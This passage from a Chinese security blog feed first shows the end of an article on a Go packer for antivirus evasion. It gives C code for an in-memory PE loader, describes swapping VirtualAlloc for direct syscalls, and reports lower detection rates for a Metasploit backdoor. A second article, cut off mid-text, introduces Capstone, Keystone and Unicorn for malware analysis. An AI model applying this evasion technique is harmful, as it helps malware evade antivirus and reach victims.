获取导入表中DLL的名称并加载DLL</span></span><br><span class="line">lpDllName = (<span class="keyword">char</span> *)((UNPTR)pDosHeader + pImportTable-&gt;Name);</span><br><span class="line">hDll = GetModuleHandleA(lpDllName);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">&#123;</span><br><span class="line">hDll = LoadLibraryA(lpDllName);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">&#123;</span><br><span class="line">pImportTable++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span></span><br><span class="line">lpImportNameArray = (PIMAGE_THUNK_DATA)((UNPTR)pDosHeader + pImportTable-&gt;OriginalFirstThunk);</span><br><span class="line"><span class="comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span></span><br><span class="line">lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((UNPTR)pDosHeader + pImportTable-&gt;FirstThunk);</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == lpImportNameArray[i].u1.AddressOfData)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">lpImportByName = (PIMAGE_IMPORT_BY_NAME)((UNPTR)pDosHeader + lpImportNameArray[i].u1.AddressOfData);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断导出函数是序号导出还是函数名称导出</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 序号导出</span></span><br><span class="line"><span class="comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span></span><br><span class="line">lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 名称导出</span></span><br><span class="line">lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 注意此处的函数地址表的赋值，要对照PE格式进行装载，不要理解错了！！！</span></span><br><span class="line">lpImportFuncAddrArray[i].u1.Function = (UNPTR)lpFuncAddress;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pImportTable++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析重定位信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DoReTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 重定位表的结构：</span></span><br><span class="line"><span class="comment">// DWORD sectionAddress, DWORD size (包括本节需要重定位的数据)</span></span><br><span class="line"><span class="comment">// 例如 1000节需要修正5个重定位数据的话，重定位表的数据是</span></span><br><span class="line"><span class="comment">// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000</span></span><br><span class="line"><span class="comment">// -----------   -----------      ----</span></span><br><span class="line"><span class="comment">// 给出节的偏移  总尺寸=8+6*2     需要修正的地址           用于对齐4字节</span></span><br><span class="line"><span class="comment">// 重定位表是若干个相连，如果address 和 size都是0 表示结束</span></span><br><span class="line"><span class="comment">// 需要修正的地址是12位的，高4位是形态字，intel cpu下是3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//假设NewBase是0x600000,而文件中设置的缺省ImageBase是0x400000,则修正偏移量就是0x200000</span></span><br><span class="line"><span class="comment">//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址</span></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">PIMAGE_BASE_RELOCATION pLoc = <span class="literal">NULL</span>;</span><br><span class="line">ULONGLONG   ImageBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line"><span class="comment">// 如果是64位 </span></span><br><span class="line">PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)(pNtHeaders);</span><br><span class="line">pLoc = (PIMAGE_BASE_RELOCATION)((UNPTR)pDosHeader + pNtHeaders64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line">ImageBase = pNtHeaders64-&gt;OptionalHeader.ImageBase;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line"><span class="comment">// 如果是32位 </span></span><br><span class="line">pLoc = (PIMAGE_BASE_RELOCATION)((UNPTR)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line">ImageBase = pNtHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否有 重定位表</span></span><br><span class="line"><span class="keyword">if</span> ((PVOID)pLoc == (PVOID)pDosHeader)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 重定位表 为空</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((pLoc-&gt;VirtualAddress + pLoc-&gt;SizeOfBlock) != <span class="number">0</span>) <span class="comment">//开始扫描重定位表</span></span><br><span class="line">&#123;</span><br><span class="line">WORD *pLocData = (WORD *)((PBYTE)pLoc + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="comment">//计算本节需要修正的重定位项（地址）的数目</span></span><br><span class="line"><span class="keyword">int</span> nNumberOfReloc = (pLoc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nNumberOfReloc; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。</span></span><br><span class="line"><span class="comment">// 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x0000A000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 64位dll重定位，IMAGE_REL_BASED_DIR64</span></span><br><span class="line"><span class="comment">// 对于IA-64的可执行文件，重定位似乎总是IMAGE_REL_BASED_DIR64类型的。</span></span><br><span class="line"></span><br><span class="line">UNPTR* pAddress = (UNPTR *)((PBYTE)pDosHeader + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line">UNPTR ullDelta = (UNPTR)pDosHeader - ImageBase;</span><br><span class="line">    *pAddress += ullDelta;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x00003000</span>) <span class="comment">//这是一个需要修正的地址</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 32位dll重定位，IMAGE_REL_BASED_HIGHLOW</span></span><br><span class="line"><span class="comment">// 对于x86的可执行文件，所有的基址重定位都是IMAGE_REL_BASED_HIGHLOW类型的。</span></span><br><span class="line">UNPTR* pAddress = (UNPTR*)((PBYTE)pDosHeader + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line">UNPTR dwDelta = (UNPTR)pDosHeader - ImageBase;</span><br><span class="line">*pAddress += dwDelta;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//转移到下一个节进行处理</span></span><br><span class="line">pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于函数 <code>VirtualAlloc</code> 是杀毒软件关注的重点函数，所以直接使用这个函数会被大多数的杀软杀掉，本文在VT上测试的时候是<code>18/69</code>,而且直接被火绒干掉，效果非常不理想:<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-00-58-55.png" alt=""></p><p>后来我利用项目 <a href="https://github.com/mai1zhi2/SysWhispers2_x86/tree/main/SysWhispers2_x86_WOW64Gate" target="_blank" rel="noopener">https://github.com/mai1zhi2/SysWhispers2_x86/tree/main/SysWhispers2_x86_WOW64Gate</a>中函数 <code>NtAllocateVirtualMemory</code> 的direct syscall 汇编代码来代替函数调用，然后获得了比较好的免杀效果。</p><p>同样使用 <code>msf</code> 生成的reverse_tcp后门进行测试：<br>免杀前的是 <code>52/70</code></p><p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-04-57.png" alt=""></p><p>免杀后是 <code>12/67</code>:</p><p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-06-11.png" alt=""></p><p>有几款杀软报毒<code>Exploit.Shellcode</code>是因为他们有沙箱，而且可以看到样本的外联行为。剩下的几款杀毒引擎一看见go语言的二进制就报毒，因为我测试go语言写的<code>hello world</code> 他们也会报毒，所以没有参考价值。<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-14-47.png" alt=""></p><p>虚拟执行能力比较强的火绒也无法检出。</p><p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-20-12.png" alt=""></p><p>添加一个编码器 <code>x86/shikata_ga_nai</code> 之后的效果看起来真的不错。<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-08-08-42.png" alt=""></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>代码比较简单,放在了github上 <a href="https://github.com/wonderkun/go-packer" target="_blank" rel="noopener">https://github.com/wonderkun/go-packer</a>，<br>需要说明一下的是,由于<code>SysWhispers2_x86_WOW64Gate</code>中有代码是使用汇编实现的，为了能使用<code>MingGw</code>进行链接，所以必须使用<code>uasm</code>进行编译(不能使用vs的masm进行编译，否则无法完成静态链接)。<br>但是mac平台安装<code>uasm</code>比较麻烦，所以只能在windows平台上进行编译。所以本代码中放的直接就是编译好的32位的静态链接库，仅支持生成32位二进制文件，如果想生成64位的二进制文件，请自行编译静态态链接库，并修改makefile。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><p><a href="https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader</a></p></li><li><p><a href="https://github.com/guitmz/ezuri" target="_blank" rel="noopener">https://github.com/guitmz/ezuri</a></p></li><li><p><a href="https://www.guitmz.com/running-elf-from-memory/" target="_blank" rel="noopener">https://www.guitmz.com/running-elf-from-memory/</a></p></li><li><p><a href="https://sysopfb.github.io/malware/2020/02/28/Golang-Wrapper-on-an-old-malware.html" target="_blank" rel="noopener">https://sysopfb.github.io/malware/2020/02/28/Golang-Wrapper-on-an-old-malware.html</a></p></li><li><p><a href="https://github.com/mai1zhi2/SysWhispers2_x86" target="_blank" rel="noopener">https://github.com/mai1zhi2/SysWhispers2_x86</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客: &lt;a href=&quot;https://www.anquanke.com/post/id/242549&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/242549&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;平时比较忙，抽不出来大把的时间来写文章，导致这个系列的更新太过于迟缓了。怕一直找理由鸽了自己，今天先更新一篇水文吧。主要说一下利用现成的工具完成比较简单的免杀工作。&lt;br&gt;&lt;strong&gt;本文的核心目标是为了能够免杀任意的二进制，而不仅仅是为了免杀msf生成的shellcode，注意跟其他文章的区别&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="杀软的无奈" scheme="http://blog.wonderkun.cc/tags/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88/"/>
    
  </entry>
  
  <entry>
    <title>杀软的无奈-基础工具篇(一)</title>
    <link href="http://blog.wonderkun.cc/2020/12/13/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%AF%87(%E4%B8%80)/"/>
    <id>http://blog.wonderkun.cc/2020/12/13/杀软的无奈-基础工具篇(一)/</id>
    <published>2020-12-13T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242548" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242548</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>杀软的无奈是我准备开始写的一个新的专题文章，主要用来分享恶意代码分析过程用到的一些方法和工具，以及shellcode编写,shellcode分析，metasploit中的shellcode编码器的实现，编码器特征码定位，编码shellcode绕过杀软检测，基于unicorn检测shellcode编码器等相关的知识。文章中讲的案例会主要集中在linux平台中的ELF文件，但是由于个人的精力和知识水平有限，文章更新的频率和质量不太敢保证。如果有地方写的不太对，希望大佬们能够积极斧正，给与一些指导和帮助。</p><a id="more"></a><p>这是这个系列的第一篇文章，俗话说万丈高楼平地起，我们第一篇主要说一下我觉得非常实用的工具，在之后的文章中我的脚本会基于这些工具开发，并不会再介绍这些基础工具的使用。</p><h2 id="相关工具的简介"><a href="#相关工具的简介" class="headerlink" title="相关工具的简介"></a>相关工具的简介</h2><ul><li>Capstone, 全能的反编译框架</li><li>Keystone, 全能的编译框架</li><li>IDAPython, 给ida神器再插上翅膀</li><li>unicorn, 基于qemu的模拟执行框架(unicorn官方版本不支持SMC，我patch了一下相关代码<a href="https://github.com/wonderkun/unicorn,建议安装这个版本" target="_blank" rel="noopener">https://github.com/wonderkun/unicorn,建议安装这个版本</a>)</li><li>flare-emu, 基于unicorn的ida插件，能够快速帮你获取你不想读的代码的执行结果。</li></ul><h2 id="全能反汇编引擎-Capstone"><a href="#全能反汇编引擎-Capstone" class="headerlink" title="全能反汇编引擎 Capstone"></a>全能反汇编引擎 Capstone</h2><p>Capstone是一个非常优秀的反汇编框架，支持多种CPU架构的，而且提供多种语言的api接口，使用起来非常的简单方便，IDA，Radare2，Qemu等著名项目都使用了Capstone Engine。</p><p>源码地址:<a href="https://github.com/aquynh/capstone.git" target="_blank" rel="noopener">https://github.com/aquynh/capstone.git</a>,官方文档: <a href="http://www.capstone-engine.org/lang_python.html" target="_blank" rel="noopener">http://www.capstone-engine.org/lang_python.html</a></p><p>一个简单的例子如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">CODE = <span class="string">b"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span><br><span class="line"></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    print(<span class="string">"%d\t0x%x:\t%s\t%s\t%s"</span> %(i.id,i.address, i.mnemonic, i.op_str,i.bytes.hex()))</span><br></pre></td></tr></table></figure><p>初始化一个Cs类，需要有两个参数，分别是平台和架构模式<br><img src="https://pic.wonderkun.cc/uploads/2021/03/16079165032315.jpg" alt=""></p><p><code>md.disasm</code> 函数需要提供两个参数，第一个参数是需要分析的bytes，第二个参数是基地址。返回一个生成器，遍历就可以得到每条指令的对象 CsInsn，它导出了与此条指令相关的很多属性，详细的解释如下：<br><img src="https://pic.wonderkun.cc/uploads/2021/03/16079168097121.jpg" alt=""></p><h2 id="全能的编译引擎-Keystone"><a href="#全能的编译引擎-Keystone" class="headerlink" title="全能的编译引擎 Keystone"></a>全能的编译引擎 Keystone</h2><p>与Capstone相对应的，那必然是keystone了，keystone与capstone功能恰好恰好相反，是一个全能的支持多种架构的编译框架。源代码地址<a href="https://github.com/keystone-engine/keystone" target="_blank" rel="noopener">https://github.com/keystone-engine/keystone</a>,官方文档地址<a href="https://www.keystone-engine.org/docs/tutorial.html" target="_blank" rel="noopener">https://www.keystone-engine.org/docs/tutorial.html</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CODE = <span class="string">b"INC ecx; DEC edx"</span> <span class="comment"># separate assembly instructions by ; or \n</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Initialize engine in X86-32bit mode</span></span><br><span class="line">    ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">    encoding, count = ks.asm(CODE)</span><br><span class="line">    print(<span class="string">"%s = %s (number of statements: %u)"</span> %(CODE, encoding, count))</span><br><span class="line"><span class="keyword">except</span> KsError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">"ERROR: %s"</span> %e)</span><br></pre></td></tr></table></figure><p>可以看到，跟Capstone的使用方法非常类似。</p><h2 id="IDAPython"><a href="#IDAPython" class="headerlink" title="IDAPython"></a>IDAPython</h2><p>ida是逆向分析的神器，但是再加上idapython那就是给神器安装上翅膀，非常好用，关于idapython的api使用说明，可以读一下我的学习记录<a href=""></a>，里面有比较好的学习资料推荐。</p><h2 id="flare-emu"><a href="#flare-emu" class="headerlink" title="flare-emu"></a>flare-emu</h2><p>是fireEye开源的一款基于unicorn，并且直接可以再ida导入使用的代码模拟执行工具，这个工具对于我们利用ida分析恶意代码或者shellcode都非常的有用，特别是复杂的加密算法，或者是恶心的自解密代码。<br>关于这款工具的使用说明可以参考这篇翻译文章<a href="https://wonderkun.cc/2020/03/02/%E7%94%A8%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%AE%9E%E7%8E%B0Objective-C%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://wonderkun.cc/2020/03/02/%E7%94%A8%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%AE%9E%E7%8E%B0Objective-C%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/</a><br>,或者直接看源代码 <a href="https://github.com/fireeye/flare-emu" target="_blank" rel="noopener">https://github.com/fireeye/flare-emu</a>，我当时修改了一个python3的版本用于支持ida7.4，<br>详情见我的github<a href="https://github.com/wonderkun/flare-emu" target="_blank" rel="noopener">https://github.com/wonderkun/flare-emu</a>。</p><p><strong>注意</strong>: 在mac平台上，ida默认使用的python并不是是用brew安装的python3，需要手工切换一下，切换方法可以参考<a href="https://github.com/wonderkun/flare-emu#intall-on-mac" target="_blank" rel="noopener">https://github.com/wonderkun/flare-emu#intall-on-mac</a>。<br>pip安装的unicorn可能不支持python3，需要自己编译安装一下unicorn。</p><h2 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a>unicorn</h2><p>Unicorn 是一款基于qemu模拟器的模拟执行框架，支持Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64)等指令集，为多种语言提供编程接口比如C/C++、Python、Java 等语言。Unicorn的DLL 可以被更多的语言调用，比如易语言、Delphi，前途无量。它的设计之初就考虑到线程安全问题，能够同时并发模拟执行代码，极大的提高了实用性。</p><p><strong>在后续分析shellcode的过程中，会遇到大量的 self-modify-code，unicorn官方提供的版本是不支持SMC代码的，<a href="https://github.com/unicorn-engine/unicorn/issues/820,所以我参照网上的方法patch了一个版本https://github.com/wonderkun/unicorn,建议安装这个版本。就目前来看是够用的，但是官方还没有接受我的pr，具体原因未知。" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/issues/820,所以我参照网上的方法patch了一个版本https://github.com/wonderkun/unicorn,建议安装这个版本。就目前来看是够用的，但是官方还没有接受我的pr，具体原因未知。</a></strong></p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>Unicorn 采用虚拟内存机制，使得虚拟CPU的内存与真实CPU的内存隔离。Unicorn 使用如下API来操作内存:</p><ul><li>mem_map</li><li>mem_read</li><li>mem_write<br>使用uc_mem_map映射内存的时候，address 与 size 都需要与0x1000对齐，也就是0x1000的整数倍，否则会报UC_ERR_ARG 异常。如何动态分配管理内存并实现libc中的malloc功能将在后面的课程中讲解。<h3 id="Hook机制"><a href="#Hook机制" class="headerlink" title="Hook机制"></a>Hook机制</h3>Unicorn的Hook机制为编程控制虚拟CPU提供了便利。<br>Unicorn 支持多种不同类型的Hook。<br>大致可以分为(hook_add第一参数，Unicorn常量)：</li><li>指令执行类<ul><li>UC_HOOK_INTR</li><li>UC_HOOK_INSN</li><li>UC_HOOK_CODE</li><li>UC_HOOK_BLOCK</li></ul></li><li>内存访问类<ul><li>UC_HOOK_MEM_READ</li><li>UC_HOOK_MEM_WRITE</li><li>UC_HOOK_MEM_FETCH</li><li>UC_HOOK_MEM_READ_AFTER</li><li>UC_HOOK_MEM_PROT</li><li>UC_HOOK_MEM_FETCH_INVALID</li><li>UC_HOOK_MEM_INVALID</li><li>UC_HOOK_MEM_VALID</li></ul></li><li>异常处理类<ul><li>UC_HOOK_MEM_READ_UNMAPPED</li><li>UC_HOOK_MEM_WRITE_UNMAPPED</li><li>UC_HOOK_MEM_FETCH_UNMAPPED<br>调用hook_add函数可添加一个Hook。Unicorn的Hook是链式的，而不是传统Hook的覆盖式，也就是说，可以同时添加多个同类型的Hook，Unicorn会依次调用每一个handler。hook callback 是有作用范围的（见hook_add begin参数）。<br>python包中的hook_add函数原型如下<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_add</span><span class="params">(self, htype, callback, user_data=None, begin=<span class="number">1</span>, end=<span class="number">0</span>, arg1=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li></ul></li><li>htype 就是Hook的类型，callback是hook回调用；</li><li>callback 是Hook的处理handler指针。请注意！不同类型的hook，handler的参数定义也是不同的。</li><li>user_data 附加参数，所有的handler都有一个user_data参数，由这里传值。</li><li>begin hook 作用范围起始地址</li><li>end hook 作用范围结束地址，默认则作用于所有代码。</li></ul><h3 id="hookcall"><a href="#hookcall" class="headerlink" title="hookcall"></a>hookcall</h3><p>不同类型的hook，对应的callback的参数也是不相同的，这里只给出C语言定义。<br>Python 编写callback的时候参考C语言即可（看参数）。</p><h4 id="UC-HOOK-CODE-amp-UC-HOOK-BLOCK-的callback定义"><a href="#UC-HOOK-CODE-amp-UC-HOOK-BLOCK-的callback定义" class="headerlink" title="UC_HOOK_CODE &amp; UC_HOOK_BLOCK 的callback定义"></a>UC_HOOK_CODE &amp; UC_HOOK_BLOCK 的callback定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">uc_cb_hookcode_t</span>)</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">uint32_t</span> <span class="built_in">size</span>, <span class="keyword">void</span> *user_data)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>address: 当前执行的指令地址</li><li>size: 当前指令的长度，如果长度未知，则为0</li><li>user_data: hook_add 设置的user_data参数</li></ul><h4 id="READ-WRITE-amp-FETCH-的-callback-定义"><a href="#READ-WRITE-amp-FETCH-的-callback-定义" class="headerlink" title="READ, WRITE &amp; FETCH 的 callback 定义"></a>READ, WRITE &amp; FETCH 的 callback 定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">uc_cb_hookmem_t</span>)</span><span class="params">(uc_engine *uc, uc_mem_type type,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">uint64_t</span> address, <span class="keyword">int</span> <span class="built_in">size</span>, <span class="keyword">int64_t</span> value, <span class="keyword">void</span> *user_data)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>type: 内存操作类型 READ, or WRITE</li><li>address: 当前指令地址</li><li>size: 读或写的长度</li><li>value: 写入的值（type = read时无视）</li><li>user_data: hook_add 设置的user_data参数</li></ul><h4 id="invalid-memory-access-events-UNMAPPED-and-PROT-events-的-callback-定义"><a href="#invalid-memory-access-events-UNMAPPED-and-PROT-events-的-callback-定义" class="headerlink" title="invalid memory access events (UNMAPPED and PROT events) 的 callback 定义"></a>invalid memory access events (UNMAPPED and PROT events) 的 callback 定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*<span class="keyword">uc_cb_eventmem_t</span>)</span><span class="params">(uc_engine *uc, uc_mem_type type,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint64_t</span> address, <span class="keyword">int</span> <span class="built_in">size</span>, <span 